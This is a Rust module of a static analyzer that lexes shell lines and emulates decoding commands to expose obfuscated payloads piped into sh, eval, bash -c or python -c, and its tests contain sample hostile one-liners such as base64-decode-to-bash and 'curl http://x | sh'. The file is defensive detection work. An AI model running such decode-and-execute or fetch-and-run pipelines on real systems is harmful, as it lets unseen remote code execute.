//! Bash and POSIX sh decoding. A small shell lexer splits each command line
//! into words and operators; a pipeline interpreter then emulates the handful
//! of commands obfuscated one-liners use (`echo`, `printf`, here-strings,
//! `base64 -d`, `base32 -d`, `xxd -r -p`, `rev`, rot13 `tr`, `gunzip`,
//! `xz -d`, `openssl base64 -d`) and recognizes what runs the result (`| sh`,
//! `eval`, `bash -c`, `source <(...)`, `python -c`).
//!
//! Commands are never run: they are recognized by name and their effect on
//! data is emulated. Anything else makes the pipeline unresolved.

use std::collections::HashMap;

use super::codecs;
use super::core::Found;
use super::eval::V;

/// Deepest nesting of `$(...)` followed.
const MAX_NEST: usize = 8;

/// Shells and interpreters that run code read from a pipe or argument.
const RUNNERS: &[&str] = &[
    "bash",
    "sh",
    "zsh",
    "dash",
    "ksh",
    "ash",
    "python",
    "python2",
    "python3",
    "perl",
    "php",
    "node",
    "ruby",
    "pwsh",
    "powershell",
];

#[derive(Debug, Clone, PartialEq, Eq)]
enum Item {
    Word(String),
    Pipe,
    /// `;`, `&&`, `||`, `&`: ends the current pipeline.
    Stop,
    /// `<<<`
    HereStr,
    /// `<( ... )` with its inner text.
    ProcSub(String),
    /// `>`, `>>`, `<`, `2>` and similar; the next word is the target.
    Redirect,
}

/// Copy a balanced `$(...)` starting at the `(` at `i`. Returns the index
/// after the closing `)`.
fn balanced_paren(chars: &[char], mut i: usize) -> usize {
    let mut depth = 0;
    while i < chars.len() {
        match chars[i] {
            '(' => depth += 1,
            ')' => {
                depth -= 1;
                if depth == 0 {
                    return i + 1;
                }
            }
            '\'' => {
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    i += 1;
                }
            }
            '"' => {
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    if chars[i] == '\\' {
                        i += 1;
                    }
                    i += 1;
                }
            }
            '\\' => i += 1,
            _ => {}
        }
        i += 1;
    }
    chars.len()
}

/// Split a command line into words and operators, keeping each word's raw
/// text (quotes included) for later expansion.
fn lex(line: &str) -> Vec<Item> {
    let chars: Vec<char> = line.chars().collect();
    let mut out = Vec::new();
    let mut word = String::new();
    let mut i = 0;
    let flush = |word: &mut String, out: &mut Vec<Item>| {
        if !word.is_empty() {
            out.push(Item::Word(std::mem::take(word)));
        }
    };
    while i < chars.len() {
        let c = chars[i];
        match c {
            c if c.is_whitespace() => {
                flush(&mut word, &mut out);
                i += 1;
            }
            '#' if word.is_empty() => break,
            '\'' => {
                let start = i;
                i += 1;
                while i < chars.len() && chars[i] != '\'' {
                    i += 1;
                }
                i = (i + 1).min(chars.len());
                word.extend(&chars[start..i]);
            }
            '"' => {
                let start = i;
                i += 1;
                while i < chars.len() && chars[i] != '"' {
                    if chars[i] == '\\' {
                        i += 1;
                    } else if chars[i] == '$' && chars.get(i + 1) == Some(&'(') {
                        i = balanced_paren(&chars, i + 1);
                        continue;
                    }
                    i += 1;
                }
                i = (i + 1).min(chars.len());
                word.extend(&chars[start..i]);
            }
            '$' if chars.get(i + 1) == Some(&'(') => {
                let end = balanced_paren(&chars, i + 1);
                word.extend(&chars[i..end]);
                i = end;
            }
            '$' if chars.get(i + 1) == Some(&'\'') => {
                let start = i;
                i += 2;
                while i < chars.len() && chars[i] != '\'' {
                    if chars[i] == '\\' {
                        i += 1;
                    }
                    i += 1;
                }
                i = (i + 1).min(chars.len());
                word.extend(&chars[start..i]);
            }
            '`' => {
                let start = i;
                i += 1;
                while i < chars.len() && chars[i] != '`' {
                    if chars[i] == '\\' {
                        i += 1;
                    }
                    i += 1;
                }
                i = (i + 1).min(chars.len());
                word.extend(&chars[start..i]);
            }
            '\\' => {
                word.push('\\');
                if let Some(n) = chars.get(i + 1) {
                    word.push(*n);
                }
                i += 2;
            }
            '|' => {
                flush(&mut word, &mut out);
                if chars.get(i + 1) == Some(&'|') {
                    out.push(Item::Stop);
                    i += 2;
                } else {
                    out.push(Item::Pipe);
                    i += 1;
                }
            }
            ';' | '&' => {
                flush(&mut word, &mut out);
                out.push(Item::Stop);
                i += if chars.get(i + 1) == Some(&'&') { 2 } else { 1 };
            }
            '<' => {
                flush(&mut word, &mut out);
                if chars.get(i + 1) == Some(&'<') && chars.get(i + 2) == Some(&'<') {
                    out.push(Item::HereStr);
                    i += 3;
                } else if chars.get(i + 1) == Some(&'(') {
                    let end = balanced_paren(&chars, i + 1);
                    let inner: String = chars[(i + 2).min(end)..end.saturating_sub(1).max(i + 2)]
                        .iter()
                        .collect();
                    out.push(Item::ProcSub(inner));
                    i = end;
                } else {
                    out.push(Item::Redirect);
                    i += 1;
                    while chars.get(i) == Some(&'<') {
                        i += 1;
                    }
                }
            }
            '>' => {
                // A digit directly before (2>) belongs to the redirect.
                if word.chars().all(|c| c.is_ascii_digit()) {
                    word.clear();
                }
                flush(&mut word, &mut out);
                out.push(Item::Redirect);
                i += 1;
                while matches!(chars.get(i), Some('>' | '&' | '|')) {
                    i += 1;
                }
            }
            _ => {
                word.push(c);
                i += 1;
            }
        }
    }
    flush(&mut word, &mut out);
    out
}

/// Decode the escapes of `$'...'` (and `echo -e` / printf, which share most).
fn ansi_c(s: &str) -> Vec<u8> {
    let chars: Vec<char> = s.chars().collect();
    let mut out = Vec::new();
    let mut i = 0;
    let hex = |from: usize, max: usize| -> (Option<u32>, usize) {
        let mut v = 0u32;
        let mut n = 0;
        while n < max {
            match chars.get(from + n).and_then(|c| c.to_digit(16)) {
                Some(d) => {
                    v = v * 16 + d;
                    n += 1;
                }
                None => break,
            }
        }
        if n == 0 { (None, 0) } else { (Some(v), n) }
    };
    while i < chars.len() {
        let c = chars[i];
        if c != '\\' || i + 1 >= chars.len() {
            let mut buf = [0u8; 4];
            out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
            i += 1;
            continue;
        }
        let n = chars[i + 1];
        i += 2;
        let simple = match n {
            'n' => Some(b'\n'),
            't' => Some(b'\t'),
            'r' => Some(b'\r'),
            'a' => Some(7),
            'b' => Some(8),
            'e' | 'E' => Some(27),
            'f' => Some(12),
            'v' => Some(11),
            '\\' => Some(b'\\'),
            '\'' => Some(b'\''),
            '"' => Some(b'"'),
            '?' => Some(b'?'),
            _ => None,
        };
        if let Some(b) = simple {
            out.push(b);
            continue;
        }
        match n {
            'x' => {
                let (v, len) = hex(i, 2);
                match v {
                    Some(v) => {
                        out.push(v as u8);
                        i += len;
                    }
                    None => out.extend_from_slice(b"\\x"),
                }
            }
            'u' | 'U' => {
                let (v, len) = hex(i, if n == 'u' { 4 } else { 8 });
                match v.and_then(char::from_u32) {
                    Some(ch) => {
                        let mut buf = [0u8; 4];
                        out.extend_from_slice(ch.encode_utf8(&mut buf).as_bytes());
                        i += len;
                    }
                    None => {
                        out.push(b'\\');
                        out.push(n as u8);
                    }
                }
            }
            '0'..='7' => {
                // \nnn, and echo's \0nnn.
                let mut v = n.to_digit(8).unwrap_or(0);
                let mut k = 0;
                let max = if n == '0' { 3 } else { 2 };
                while k < max {
                    match chars.get(i).and_then(|c| c.to_digit(8)) {
                        Some(d) => {
                            v = v * 8 + d;
                            i += 1;
                            k += 1;
                        }
                        None => break,
                    }
                }
                out.push((v & 0xff) as u8);
            }
            other => {
                out.push(b'\\');
                let mut buf = [0u8; 4];
                out.extend_from_slice(other.encode_utf8(&mut buf).as_bytes());
            }
        }
    }
    out
}

/// A value with the decode steps that produced it.
#[derive(Debug, Clone)]
struct Data {
    bytes: Vec<u8>,
    steps: Vec<String>,
}

struct Shell {
    vars: HashMap<String, Data>,
}

impl Shell {
    /// Expand one raw word: quotes, `$'...'`, variables and `$(...)`.
    /// Returns None when something cannot be resolved statically.
    fn expand(&self, raw: &str, nest: usize) -> Option<Data> {
        let chars: Vec<char> = raw.chars().collect();
        let mut out = Vec::new();
        let mut steps = Vec::new();
        let mut i = 0;
        while i < chars.len() {
            let c = chars[i];
            match c {
                '\'' => {
                    i += 1;
                    while i < chars.len() && chars[i] != '\'' {
                        push_char(&mut out, chars[i]);
                        i += 1;
                    }
                    i += 1;
                }
                '$' if chars.get(i + 1) == Some(&'\'') => {
                    let start = i + 2;
                    let mut j = start;
                    while j < chars.len() && chars[j] != '\'' {
                        if chars[j] == '\\' {
                            j += 1;
                        }
                        j += 1;
                    }
                    let body: String = chars[start..j.min(chars.len())].iter().collect();
                    if body.contains('\\') {
                        steps.push("ansi-c".to_string());
                    }
                    out.extend(ansi_c(&body));
                    i = j + 1;
                }
                '"' => {
                    i += 1;
                    while i < chars.len() && chars[i] != '"' {
                        if chars[i] == '\\'
                            && matches!(chars.get(i + 1), Some('$' | '`' | '"' | '\\'))
                        {
                            push_char(&mut out, chars[i + 1]);
                            i += 2;
                            continue;
                        }
                        if chars[i] == '$' || chars[i] == '`' {
                            let (d, next) = self.dollar(&chars, i, nest)?;
                            out.extend(d.bytes);
                            steps.extend(d.steps);
                            i = next;
                            continue;
                        }
                        push_char(&mut out, chars[i]);
                        i += 1;
                    }
                    i += 1;
                }
                '$' | '`' => {
                    let (d, next) = self.dollar(&chars, i, nest)?;
                    out.extend(d.bytes);
                    steps.extend(d.steps);
                    i = next;
                }
                '\\' => {
                    if let Some(n) = chars.get(i + 1) {
                        push_char(&mut out, *n);
                    }
                    i += 2;
                }
                _ => {
                    push_char(&mut out, c);
                    i += 1;
                }
            }
        }
        Some(Data { bytes: out, steps })
    }

    /// Expand `$VAR`, `${VAR}`, `$(...)` or a backtick substitution at `i`.
    fn dollar(&self, chars: &[char], i: usize, nest: usize) -> Option<(Data, usize)> {
        if chars[i] == '`' {
            let mut j = i + 1;
            while j < chars.len() && chars[j] != '`' {
                if chars[j] == '\\' {
                    j += 1;
                }
                j += 1;
            }
            let inner: String = chars[i + 1..j.min(chars.len())].iter().collect();
            return Some((self.substitute(&inner, nest)?, j + 1));
        }
        match chars.get(i + 1) {
            Some('(') => {
                let end = balanced_paren(chars, i + 1);
                let inner: String = chars[i + 2..end.saturating_sub(1).max(i + 2)]
                    .iter()
                    .collect();
                Some((self.substitute(&inner, nest)?, end))
            }
            Some('{') => {
                let close = chars[i + 2..].iter().position(|c| *c == '}')? + i + 2;
                let name: String = chars[i + 2..close].iter().collect();
                Some((self.vars.get(&name)?.clone(), close + 1))
            }
            Some(c) if c.is_ascii_alphabetic() || *c == '_' => {
                let mut j = i + 1;
                while j < chars.len() && (chars[j].is_ascii_alphanumeric() || chars[j] == '_') {
                    j += 1;
                }
                let name: String = chars[i + 1..j].iter().collect();
                Some((self.vars.get(&name)?.clone(), j))
            }
            _ => {
                // A lone `$`.
                Some((
                    Data {
                        bytes: b"$".to_vec(),
                        steps: Vec::new(),
                    },
                    i + 1,
                ))
            }
        }
    }

    /// Run a command substitution: its output without trailing newlines.
    fn substitute(&self, inner: &str, nest: usize) -> Option<Data> {
        if nest >= MAX_NEST {
            return None;
        }
        let items = lex(inner);
        let (mut d, sink) = self.pipeline(&items, nest + 1)?;
        if sink.is_some() {
            return None;
        }
        while d.bytes.last() == Some(&b'\n') {
            d.bytes.pop();
        }
        Some(d)
    }

    /// Evaluate the first pipeline in `items`. Returns its output and, when
    /// the last stage runs code, that runner's name.
    fn pipeline(&self, items: &[Item], nest: usize) -> Option<(Data, Option<String>)> {
        let mut stages: Vec<Vec<&Item>> = vec![Vec::new()];
        for it in items {
            match it {
                Item::Pipe => stages.push(Vec::new()),
                Item::Stop => break,
                other => stages.last_mut()?.push(other),
            }
        }
        let mut data: Option<Data> = None;
        for (k, stage) in stages.iter().enumerate() {
            let words: Vec<String> = stage
                .iter()
                .filter_map(|i| match i {
                    Item::Word(w) => Some(w.clone()),
                    _ => None,
                })
                .collect();
            let here = stage
                .iter()
                .position(|i| **i == Item::HereStr)
                .and_then(|p| match stage.get(p + 1) {
                    Some(Item::Word(w)) => Some(w.clone()),
                    _ => None,
                });
            // Words before any here-string or redirect are the command.
            let cmd: Vec<String> = stage
                .iter()
                .take_while(|i| matches!(i, Item::Word(_)))
                .filter_map(|i| match i {
                    Item::Word(w) => self
                        .expand(w, nest)
                        .map(|d| String::from_utf8_lossy(&d.bytes).into_owned()),
                    _ => None,
                })
                .collect();
            let name = cmd
                .first()
                .map(|c| c.rsplit('/').next().unwrap_or(c).to_string())
                .unwrap_or_default();

            if k == 0 {
                if let Some(h) = &here {
                    let mut d = self.expand(h, nest)?;
                    d.bytes.push(b'\n');
                    data = Some(if name == "cat" {
                        d
                    } else {
                        self.transform(&cmd, d)?
                    });
                    continue;
                }
                data = Some(self.source(&name, stage, &words, nest)?);
                continue;
            }
            let input = data.take()?;
            if is_runner(&name, &cmd) {
                return Some((input, Some(name)));
            }
            data = Some(self.transform(&cmd, input)?);
        }
        data.map(|d| (d, None))
    }

    /// The first stage: echo or printf.
    fn source(&self, name: &str, stage: &[&Item], words: &[String], nest: usize) -> Option<Data> {
        let _ = stage;
        match name {
            "echo" => {
                let mut newline = true;
                let mut escapes = false;
                let mut args = Vec::new();
                let mut flags_done = false;
                for w in &words[1..] {
                    let d = self.expand(w, nest)?;
                    let text = String::from_utf8_lossy(&d.bytes).into_owned();
                    if !flags_done
                        && text.starts_with('-')
                        && text.len() > 1
                        && text[1..].chars().all(|c| "neE".contains(c))
                    {
                        newline &= !text.contains('n');
                        if text.contains('e') {
                            escapes = true;
                        }
                        continue;
                    }
                    flags_done = true;
                    args.push(d);
                }
                let mut steps = Vec::new();
                let mut bytes = Vec::new();
                for (k, a) in args.into_iter().enumerate() {
                    if k > 0 {
                        bytes.push(b' ');
                    }
                    steps.extend(a.steps);
                    bytes.extend(a.bytes);
                }
                if escapes && bytes.contains(&b'\\') {
                    bytes = ansi_c(&String::from_utf8_lossy(&bytes));
                    steps.push("escapes".to_string());
                }
                if newline {
                    bytes.push(b'\n');
                }
                Some(Data { bytes, steps })
            }
            "printf" => {
                let fmt = self.expand(words.get(1)?, nest)?;
                let args: Vec<Data> = words[2..]
                    .iter()
                    .map(|w| self.expand(w, nest))
                    .collect::<Option<_>>()?;
                let mut steps = fmt.steps.clone();
                let fmt_s = String::from_utf8_lossy(&fmt.bytes).into_owned();
                // Substitute %s and %b in order; other conversions are unsupported.
                let mut out = Vec::new();
                let mut ai = args.iter();
                let mut chars = fmt_s.chars().peekable();
                let mut seg = String::new();
                while let Some(c) = chars.next() {
                    if c == '%' {
                        match chars.next() {
                            Some('s') | Some('b') => {
                                out.extend(ansi_c(&std::mem::take(&mut seg)));
                                if let Some(a) = ai.next() {
                                    steps.extend(a.steps.clone());
                                    out.extend(a.bytes.clone());
                                }
                            }
                            Some('%') => seg.push('%'),
                            _ => return None,
                        }
                    } else {
                        seg.push(c);
                    }
                }
                if fmt_s.contains('\\') {
                    steps.push("printf".to_string());
                }
                out.extend(ansi_c(&seg));
                Some(Data { bytes: out, steps })
            }
            "cat" if words.len() == 1 => None,
            _ => None,
        }
    }

    /// Apply one pipeline stage to data.
    fn transform(&self, cmd: &[String], mut d: Data) -> Option<Data> {
        let name = cmd
            .first()
            .map(|c| c.rsplit('/').next().unwrap_or(c))
            .unwrap_or("");
        let has = |flag: &str| cmd.iter().skip(1).any(|a| a == flag);
        let short = |c: char| {
            cmd.iter()
                .skip(1)
                .any(|a| a.starts_with('-') && !a.starts_with("--") && a.contains(c))
        };
        let (out, step): (Option<Vec<u8>>, &str) = match name {
            "base64" if short('d') || short('D') || has("--decode") => {
                (codecs::b64(&d.bytes, false), "base64")
            }
            "base32" if short('d') || has("--decode") => (codecs::b32(&d.bytes), "base32"),
            "xxd" if short('r') && short('p') => (codecs::hex(&d.bytes), "hex"),
            "openssl"
                if cmd
                    .iter()
                    .any(|a| a == "base64" || a == "-base64" || a == "enc")
                    && short('d') =>
            {
                (codecs::b64(&d.bytes, false), "base64")
            }
            "gunzip" | "zcat" => (codecs::gunzip(&d.bytes), "gzip"),
            "gzip" if short('d') || has("--decompress") => (codecs::gunzip(&d.bytes), "gzip"),
            "unxz" | "xzcat" | "unlzma" | "lzcat" => (codecs::unlzma(&d.bytes), "xz"),
            "xz" | "lzma" if short('d') || has("--decompress") => (codecs::unlzma(&d.bytes), "xz"),
            "rev" => {
                let text = String::from_utf8_lossy(&d.bytes).into_owned();
                let mut out: Vec<String> = text
                    .split('\n')
                    .map(|l| l.chars().rev().collect())
                    .collect();
                if text.ends_with('\n') {
                    out.pop();
                    out.push(String::new());
                }
                (Some(out.join("\n").into_bytes()), "reverse")
            }
            "tr" => {
                let sets: Vec<String> = cmd[1..]
                    .iter()
                    .filter(|a| !a.starts_with('-'))
                    .cloned()
                    .collect();
                let rot = matches!(
                    (
                        sets.first().map(String::as_str),
                        sets.get(1).map(String::as_str)
                    ),
                    (Some("A-Za-z"), Some("N-ZA-Mn-za-m"))
                        | (Some("a-zA-Z"), Some("n-za-mN-ZA-M"))
                        | (Some("N-ZA-Mn-za-m"), Some("A-Za-z"))
                        | (Some("n-za-mN-ZA-M"), Some("a-zA-Z"))
                );
                if !rot {
                    return None;
                }
                (
                    Some(codecs::rot13(&String::from_utf8_lossy(&d.bytes)).into_bytes()),
                    "rot13",
                )
            }
            "cat" | "tee" if cmd.len() == 1 || name == "tee" => return Some(d),
            _ => return None,
        };
        d.bytes = out?;
        d.steps.push(step.to_string());
        Some(d)
    }
}

fn push_char(out: &mut Vec<u8>, c: char) {
    let mut buf = [0u8; 4];
    out.extend_from_slice(c.encode_utf8(&mut buf).as_bytes());
}

/// Whether a stage runs its stdin as code: `sh`, `bash -s`, `python3 -`,
/// `source /dev/stdin`.
fn is_runner(name: &str, cmd: &[String]) -> bool {
    if (name == "source" || name == ".")
        && cmd.get(1).is_some_and(|a| a == "/dev/stdin" || a == "-")
    {
        return true;
    }
    RUNNERS.contains(&name) && cmd[1..].iter().all(|a| a.starts_with('-'))
}

/// Logical lines (backslash continuations joined) with their start line.
fn logical_lines(text: &str) -> Vec<(usize, String)> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut start = 1;
    for (n, line) in text.lines().enumerate() {
        if cur.is_empty() {
            start = n + 1;
        }
        if let Some(stripped) = line.strip_suffix('\\') {
            cur.push_str(stripped);
            cur.push(' ');
            continue;
        }
        cur.push_str(line);
        out.push((start, std::mem::take(&mut cur)));
    }
    if !cur.is_empty() {
        out.push((start, cur));
    }
    out
}

/// Interpreters whose `-c`/`-e`/`-Command` argument is code, by flag.
fn inline_flag(name: &str) -> Option<&'static [&'static str]> {
    match name {
        "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash" => Some(&["-c"]),
        "python" | "python2" | "python3" => Some(&["-c"]),
        "perl" | "ruby" | "node" => Some(&["-e"]),
        "pwsh" | "powershell" | "powershell.exe" | "pwsh.exe" => {
            Some(&["-c", "-command", "-Command"])
        }
        _ => None,
    }
}

/// Scan a script for decodable shell payloads.
pub fn analyze(text: &str) -> Vec<Found> {
    let mut sh = Shell {
        vars: HashMap::new(),
    };
    let mut found = Vec::new();
    for (line_no, line) in logical_lines(text) {
        let items = lex(&line);
        // Each `;`/`&&`-separated command on the line.
        for cmd_items in items.split(|i| *i == Item::Stop) {
            let words: Vec<&String> = cmd_items
                .iter()
                .filter_map(|i| match i {
                    Item::Word(w) => Some(w),
                    _ => None,
                })
                .collect();
            let Some(first) = words.first() else { continue };

            // NAME=value assignments (optionally after export/local).
            let assign = if matches!(first.as_str(), "export" | "local" | "readonly" | "declare") {
                words.get(1).copied()
            } else {
                Some(*first)
            };
            if let Some(a) = assign
                && let Some((name, value)) = a.split_once('=')
                && !name.is_empty()
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
                && !name.starts_with(|c: char| c.is_ascii_digit())
                && words.len() <= 2
            {
                if let Some(d) = sh.expand(value, 0) {
                    if !d.steps.is_empty() {
                        found.push(Found {
                            line: line_no,
                            sink: None,
                            steps: d.steps.clone(),
                            value: V::Bytes(d.bytes.clone()),
                        });
                    }
                    sh.vars.insert(name.to_string(), d);
                } else {
                    sh.vars.remove(name);
                }
                continue;
            }

            let name = first.rsplit('/').next().unwrap_or(first).to_string();

            // eval ARGS: the joined, expanded arguments are code.
            if name == "eval" {
                let parts: Option<Vec<Data>> = words[1..].iter().map(|w| sh.expand(w, 0)).collect();
                if let Some(parts) = parts {
                    let mut bytes = Vec::new();
                    let mut steps = Vec::new();
                    for (k, p) in parts.into_iter().enumerate() {
                        if k > 0 {
                            bytes.push(b' ');
                        }
                        bytes.extend(p.bytes);
                        steps.extend(p.steps);
                    }
                    if !steps.is_empty() {
                        found.push(Found {
                            line: line_no,
                            sink: Some("eval".to_string()),
                            steps,
                            value: V::Bytes(bytes),
                        });
                    }
                }
                continue;
            }

            // bash <(PIPE), source <(PIPE), . <(PIPE)
            if let Some(Item::ProcSub(inner)) =
                cmd_items.iter().find(|i| matches!(i, Item::ProcSub(_)))
                && (RUNNERS.contains(&name.as_str()) || name == "source" || name == ".")
            {
                if let Some((d, None)) = sh.pipeline(&lex(inner), 1)
                    && !d.steps.is_empty()
                {
                    found.push(Found {
                        line: line_no,
                        sink: Some(name.clone()),
                        steps: d.steps,
                        value: V::Bytes(d.bytes),
                    });
                }
                continue;
            }

            // bash -c ARG, python3 -c ARG, perl -e ARG, pwsh -Command ARG
            if let Some(flags) = inline_flag(&name)
                && let Some(pos) = words.iter().position(|w| flags.contains(&w.as_str()))
                && let Some(arg) = words.get(pos + 1)
                && let Some(d) = sh.expand(arg, 0)
            {
                let mut steps = d.steps;
                if steps.is_empty() {
                    if d.bytes.len() < 16 {
                        continue;
                    }
                    steps.push("inline".to_string());
                }
                found.push(Found {
                    line: line_no,
                    sink: Some(format!("{name} {}", words[pos])),
                    steps,
                    value: V::Bytes(d.bytes),
                });
                continue;
            }

            // A plain pipeline: decoded output, run or not.
            if let Some((d, sink)) = sh.pipeline(cmd_items, 0)
                && (!d.steps.is_empty() || sink.is_some())
                && cmd_items.contains(&Item::Pipe)
            {
                if d.steps.is_empty() && d.bytes.len() < 16 {
                    continue;
                }
                found.push(Found {
                    line: line_no,
                    sink,
                    steps: if d.steps.is_empty() {
                        vec!["literal".to_string()]
                    } else {
                        d.steps
                    },
                    value: V::Bytes(d.bytes),
                });
            }
        }
    }
    found
}

#[cfg(test)]
mod tests {
    use super::*;
    use base64::Engine as _;
    use std::io::Write;

    fn b64(s: &[u8]) -> String {
        base64::engine::general_purpose::STANDARD.encode(s)
    }

    fn one(src: &str) -> Found {
        let mut f = analyze(src);
        assert!(!f.is_empty(), "nothing found in {src:?}");
        f.remove(0)
    }

    fn text(f: &Found) -> String {
        match &f.value {
            V::Bytes(b) => String::from_utf8_lossy(b).into_owned(),
            V::Str(s) => s.clone(),
            _ => String::new(),
        }
    }

    #[test]
    fn echo_base64_pipe_bash() {
        let f = one(&format!(
            "echo {} | base64 -d | bash",
            b64(b"id; uname -a\n")
        ));
        assert_eq!(text(&f), "id; uname -a\n");
        assert_eq!(f.sink.as_deref(), Some("bash"));
        assert_eq!(f.steps, ["base64"]);
    }

    #[test]
    fn gzip_and_variants() {
        let mut g = flate2::write::GzEncoder::new(Vec::new(), flate2::Compression::default());
        g.write_all(b"curl http://x | sh\n").unwrap();
        let blob = b64(&g.finish().unwrap());
        let f = one(&format!("echo '{blob}' | base64 --decode | gunzip | sh -s"));
        assert_eq!(text(&f), "curl http://x | sh\n");
        assert_eq!(f.steps, ["base64", "gzip"]);
        assert_eq!(f.sink.as_deref(), Some("sh"));
    }

    #[test]
    fn eval_command_substitution() {
        let f = one(&format!("eval \"$(echo {} | base64 -d)\"", b64(b"whoami")));
        assert_eq!(f.sink.as_deref(), Some("eval"));
        assert_eq!(text(&f), "whoami");
    }

    #[test]
    fn bash_c_and_here_string() {
        let f = one(&format!(
            "bash -c \"$(base64 -d <<< {})\"",
            b64(b"echo pwned")
        ));
        assert_eq!(f.sink.as_deref(), Some("bash -c"));
        assert_eq!(text(&f), "echo pwned");
    }

    #[test]
    fn variables_and_process_substitution() {
        let src = format!(
            "P={}\nsource <(echo $P | base64 -d)",
            b64(b"echo hi from var")
        );
        let f = analyze(&src);
        let run = f.iter().find(|f| f.sink.is_some()).unwrap();
        assert_eq!(run.sink.as_deref(), Some("source"));
        assert_eq!(text(run), "echo hi from var");
        assert_eq!(run.line, 2);
    }

    #[test]
    fn ansi_c_and_printf_and_xxd_and_rev() {
        let f = one(r"eval $'\x77\x68\x6f\x61\x6d\x69'");
        assert_eq!(text(&f), "whoami");
        assert_eq!(f.steps, ["ansi-c"]);

        let f = one(r"printf '\x69\x64\n' | sh");
        assert_eq!(text(&f), "id\n");
        assert_eq!(f.sink.as_deref(), Some("sh"));

        let f = one("echo 6964 | xxd -r -p | bash");
        assert_eq!(text(&f), "id");

        let f = one("echo 'imaohw' | rev | bash");
        assert_eq!(text(&f), "whoami\n");
        assert_eq!(f.steps, ["reverse"]);

        let f = one("echo 'jubnzv' | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh");
        assert_eq!(text(&f), "whoami\n");
    }

    #[test]
    fn python_inline_payload() {
        let f = one("python3 -c \"import base64;exec(base64.b64decode('cHJpbnQoMSk='))\"");
        assert_eq!(f.sink.as_deref(), Some("python3 -c"));
        assert!(text(&f).starts_with("import base64"));
        assert_eq!(f.steps, ["inline"]);
    }

    #[test]
    fn decoded_to_file_without_runner() {
        let f = one(&format!(
            "echo {} | base64 -d > /tmp/x.sh",
            b64(b"#!/bin/sh\nid\n")
        ));
        assert_eq!(f.sink, None);
        assert_eq!(text(&f), "#!/bin/sh\nid\n");
    }

    #[test]
    fn unknown_commands_are_not_guessed() {
        assert!(analyze("curl -s http://x/a.sh | bash").is_empty());
        assert!(analyze("echo hello | grep h | sh").is_empty());
        assert!(analyze("ls -la /tmp\nexport PATH=$PATH:/opt/bin\n").is_empty());
    }

    #[test]
    fn continuation_lines() {
        let f = one(&format!(
            "echo {} \\\n | base64 -d \\\n | bash",
            b64(b"uptime")
        ));
        assert_eq!(text(&f), "uptime");
        assert_eq!(f.line, 1);
    }

    #[test]
    fn hostile_input_does_not_panic() {
        for s in [
            "$(",
            "$((((",
            "`",
            "$'\\x",
            "echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo $(echo hi)))))))))) | sh",
            "<(",
            "a=$(",
            "eval $'",
            "printf '%d' 1 | sh",
        ] {
            let _ = analyze(s);
        }
    }
}
